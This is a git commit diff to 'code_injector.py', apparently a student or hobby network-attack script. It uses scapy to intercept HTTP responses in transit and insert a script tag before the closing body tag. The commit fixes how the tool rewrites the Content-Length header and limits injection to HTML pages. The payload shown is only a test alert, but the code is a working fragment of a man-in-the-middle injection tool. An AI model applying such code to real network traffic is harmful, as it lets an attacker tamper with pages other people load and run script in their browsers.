760689af680741e22467f85184b6150ff828a291
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-09-20 13:44:57 -0400

    More changes re: content length
    Updated code to work on pages that both send a set content length and those that do not

--- code_injector.py
+++ code_injector.py
@@ -25,10 +25,10 @@ def process_packet(packet):
             injection_code = "<script>alert('test');</script>"
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-            if content_length_search:
+            if content_length_search and "text/html" in load:
                 content_length = content_length_search.group(1)
                 new_content_length = int(content_length) + len(injection_code)
-                load = load.replace(content_length, new_content_length)
+                load = load.replace(content_length, str(new_content_length))
                 print(content_length)
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
